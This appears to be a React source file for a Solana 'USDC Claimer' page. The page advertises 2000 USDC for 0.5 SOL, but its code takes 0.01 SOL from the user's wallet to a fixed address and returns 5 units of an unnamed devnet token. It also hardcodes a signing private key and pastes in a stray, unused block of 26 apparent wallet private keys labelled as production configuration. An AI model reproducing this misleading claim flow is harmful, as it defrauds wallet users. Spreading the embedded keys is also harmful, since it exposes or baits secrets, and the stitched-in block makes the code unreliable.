/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2kPq6ekJqYbSvdGTWafHoDcx4q9HmYEWHiLwA2kUjt8nvwCV8FJ6mMvmuwGK5P7MFmNCfUDWJWWjzR8hjtRcpTwT"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "65b1Fvr4oZ8bWyuwvAbtQ4k3WUB3ykh16JypT8CXbMZWG4gBamPcEMXw95QDbTRDH7rDw6jhSmRXHD2r5qaZ926Y",
  "key1": "2mgGhqFTGqqCjQgPN5XS1YBoPXou9oe8cckSXsUZ6jUcpyAoE5kR8X43C2Vzr7hH5MYHpzLGmL2LStbgciZZP5bC",
  "key2": "29TMQwug7oFQbQNJD4qTE7mF4pMyEmZbRZHLELirMQuE1k8tuz5WodonjrrqspiXJoj9U2k7z4GCjFcGSBHyGxFN",
  "key3": "3fzQX4Nms4ATAoUPX43rEQL5k6Z2Dysn5x1RgEooHfs1zTcqGch7xVURxJ1vMKGWHFHevXu3CW89ogzt8XMUXmVH",
  "key4": "3dN3pA6Bv5foG8eR4aUfGo9w8KQdZ6kaGMJ6UqhutFWYbF6BkQH7DUmPPo9YqUiTUXPcT26QAeL7uiYLRbgaph7",
  "key5": "2wvzDCwvijpZumfX5P2SZPDwQXtdWcVeNLBTp39MrjJdRDaxeSZd1h4HUj9rsyHdpTm3msfr3MRkasaZNjWbjwqN",
  "key6": "e5d5yR1ockvWCQk5MeJ15CC6paVf3E4rZcjZgTygnfWCVrWSxtgxnwfm9DV21FDemrtbQNCgM8qMTkK1wVwfhFi",
  "key7": "2417WT5mn7cL2zUd23KG83QHvfbWTRZpHacNxhjLn9wRntHW5AmrsoxDRLwyU6k7wX3eZGM4XVsSs54Dzr2cWxQL",
  "key8": "xcrip3ZrBkP7tU2ykSFQdp6RjrjVvRFz6iZ7WivkkybJ953LNX38E6o58WMKUXMhxS5gESV5ZXucCjc8qUzsCMU",
  "key9": "3Lvwu5kYmbuy6Qrarm8TtXadNQzu9CaqPBGpVLhZXEkZ1DisnPRKM5scL75UxscxGioNFM9FedEyLurTuQoCPu5b",
  "key10": "4WVpwL6fVnpvRwVCfypQFSA7WoPJZ29q5DzhL3qPjDScCfGatddiJjZGoxaXNur89wPRv8cbcre4ELS7tdofRRnE",
  "key11": "i9kyv1ASRPEAnJX2h5sx7UJpHHAWJKs2fCUKibt9CEcaFbdQ77hVUUyt4t1aNaCKt97hCDLeWmZkRWNmzBs3FfR",
  "key12": "hJBdg26F2sxAF2eWpFVyiwh9ttSNjpq3V1H8DUgfbezPSxBNXD4hGhFZFynV7w1XhyjdDJZRemc3CSMSCDTaYY4",
  "key13": "49KiroQoFeWP4mTYFqaVQ3ppZmoB5wtf5isZC464YN51ChvncAhuqzSak6LmkNTrnZaMeVNL4gBfBkSvU5EjSxqu",
  "key14": "3qn7GrtLHGvsd4RfRWgeosRDj6JyKuzhmk5txLtiHgzK4obbedCpsE2Q91KAqUV4gE2Y79Cvd8ZDyJsuzfX8cGXv",
  "key15": "5agkL4wczUzHXaxCN2meHLn43Tnp6DuJdfiksgPnjzPA1kBSiGU4LZva4BJoVWDGGASRAU2u8YDATDtyBzRz8bah",
  "key16": "5vybDroGG5yMVDT71ydt5xJYPizoCWq7xTuF4xqAsD25REHzm3ygU8Bqc1YQX4x2EBBwR9wZHYv9GerYdQTt1j9P",
  "key17": "4NPAhVj6NRAG76cHiQnbrwpLpREPZ3XdqFhH1jQ497f2EN7DMeNFS6iZLJRMugMaXUeqDsy5vvdumjT26kMKLgeL",
  "key18": "4cKAzXistyVN1qECyfFC62LWcNcgfh96qsd65fcbgWyzJRtaXunPLowaJYBZ882fqJSGgh7vmVH4AKvC13q9iBK8",
  "key19": "5pmVpY3BnQaZYgy52UwUXPqsmpCB1XAtWMCEDz3MVgZaYN4NKyF2dmbhn6EQcEHzXXA81Rf3S17wfREeuVfCE1kC",
  "key20": "437wjqi3yvpEpVwt1tMoUZAQoM66LvoExH2b46FzyBTyodUuw6DgfM23vqNuDh3goXbx9PyW2gbW6kDqHvrb5eW6",
  "key21": "3XqNferS3PpbgmbzmJfUtUqP43QjC6kbfQCGcpGKjMT5eGoBsioRV7MEadCYNdEJpaYkmkw59YQAqTKYD4Pvamxw",
  "key22": "3wDt6wsp8bN5RWWmuDtEPvRbMFNzRh4PsLdAjtDCuHzQsRkQSMzKdR1ehnGdRsiQbEoyGcK4n41QDXUTwc8gL5kn",
  "key23": "5DPevGH7vCKNs6Dcj7LMw2CciTjBuBfcVjx74rMMp9y1HvinSf7GM2aQkcrZKSNiC2oTeq9ngZv8VHbrEiDjYkE1",
  "key24": "3PRUMiggAZzExV2XyWoxHebWnBpdSKfFCmN8Z6XQmrM4dwt6nRZRX7X8Yiqa9LEBbP2MaoUkJDVS2HAjGfLpN8J7",
  "key25": "4t6wAteYiv6XnTrTZDTF3ZpzsoYA8PiMwU9AEbEBE8rAzxbapuqTERYuA6UYyXmxchUL7Xug9b5VWFr2TvRVhRhm"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
